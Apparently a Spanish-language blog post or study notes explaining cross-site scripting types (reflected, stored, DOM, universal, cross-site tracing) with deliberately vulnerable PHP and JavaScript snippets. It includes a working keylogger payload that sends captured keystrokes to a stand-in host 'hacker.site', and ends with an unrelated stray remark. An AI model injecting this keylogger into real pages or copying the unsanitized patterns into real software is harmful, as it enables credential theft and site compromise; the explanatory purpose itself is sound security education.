---
title: 'Cross-Site Scripting (XSS)'
description: ''
pubDate: 'Jul 08 2022'
heroImage: '/placeholder-hero.jpg'
---

### Reflected XSS (server)

Ocurre cuando la data del usuario es enviada a la aplicación web y es inmediatamente repetida de vuelta al contenido no confiable

La victima trae la carga en su request a la página vulnerable,
esta carga se inserta en la webapp y el navegador lo executa.

```php
<?php $name = @$_GET['name']; ?>

Welcome <?=$name?>
```

### Stored or Persistent XSS (server)
La carga se ejecuta en todos los usuarios que visiten la página.
El código es guardado por la app, sin sanitizar y luego rendereado.

El código malicioso puede ser injectado, por los atacantes, directamente por la webapp.

```php

<?php
$file = 'newcomers.log';
if(@$_GET['name']) {
  $current = file_get_contents($file);
  $current .= $_GET['name']."\n";
  // almacena 'newcomer'
  file_put_contents($file, $current);
}
// si admin muestra 'newcomers'
if(@$_GET['admin'] == 1) {
  echo file_get_contents($file);
}
>

```

### DOM XSS | Type-0 | Local XSS (client)

Es dado cuando JavaScript usa los datos del usuario como parte de su lógica igual que *reflected* pero sin interactuar con el lado del navegador.

```php
# Toda la información del DOM esta disponible, URL, history, cookies, etc. 

# Hay dos llaves fundamentales: SOURCES y SINKS
<h1 id='welcome'></h1>
<script>
  var w = "Welcome";
  // location.hash -> SOURCE del input desconfiable
  var name = document.location.hash.substr(
    document.location.hash.search(/#w!/i) + 3,
    document.location.hash.length
  );
  // innerHTML -> SINK donde el input es usado
  document.getElementById('welcome').innerHTML = w + name;
</script>

# Sumideros(sinks) son como puntos en la corriente de agua donde dependiendode la fuente(input del usuario) puede ser peligroso resultando en la perdida de Confidencialidad, Integridad y Disponibilidad.
```

### Universal XSS | UXSS

No aprovecha las fallas de la "App" sino de las extensiones, plugins.

### Cross-Site Tracking (XST)

<script>
  // TRACE Request
  var xmlhttp = new XMLHttpRequest()
  var url = 'http://victim.site'
  xmlhttp.withCredentials = true
  xmlhttp.open('TRACE', url)

  // Callback para registrar todas las cabezeras de la respuesta
  function hand() {
    console.log(this.getAllResponseHeaders())
  }
  xmlhttp.onreadystatechange = hand
  xmlhttp.send()
  // Si todo va bien podemos leer las cabezeras de vuelta del request'TRACE', esta tecnica es antigua y los navegadores lo bloquean
</script>

### XSS Ataques

- Recoleccion de cookies
- Desfiguraciones
- Phishing
- Keylogging
- Ataques de Red
- Auto-XXS


**Desfiguraciones**

Con este ataque se intenta dar un mensaje preciso o información engañosa a los usuarios.

*Virtul:* Si explotamos un defecto que no modifique el contenido hosteado en la web objetivo, entonces es un desfiguracion virtual. Esto pasa en XSS Reflejado

*Persistente:* En este caso la página es modificada permanentemente, el atacante no necesita engañar a los usuarios para que visiten una URL creada.

**Phishing**

URLCrazy es una herramienta de linea de comandos que genera y prueba tipos de dominios y variaciones para detectar y realizar allanamiento de tipos, URL hijacking, phishing, y espionaje.

**keylogging**

```javascript
var keys=''
document.onkeypress = function(e) {
  var get = window.event ? event : e
  var key = get.keyCode ? get.keyCode : get.charCode
  key = String.fromCharCode(key)
  keys += key
}

window.setInterval(() => {
  if (keys !== '') {
    var path = encodeURI("http://hacker.site/keylogger?k="+keys)
    new Image().src = path
    keys = ''
  }
}, 1000)

```
Algunos frameworks:

- *http_javascript_keylogger (Metasploit)*
- *Event logger:* Es mas sofisticado


Pq se termina el curro de los microfonos ensobrados hijos de la pauta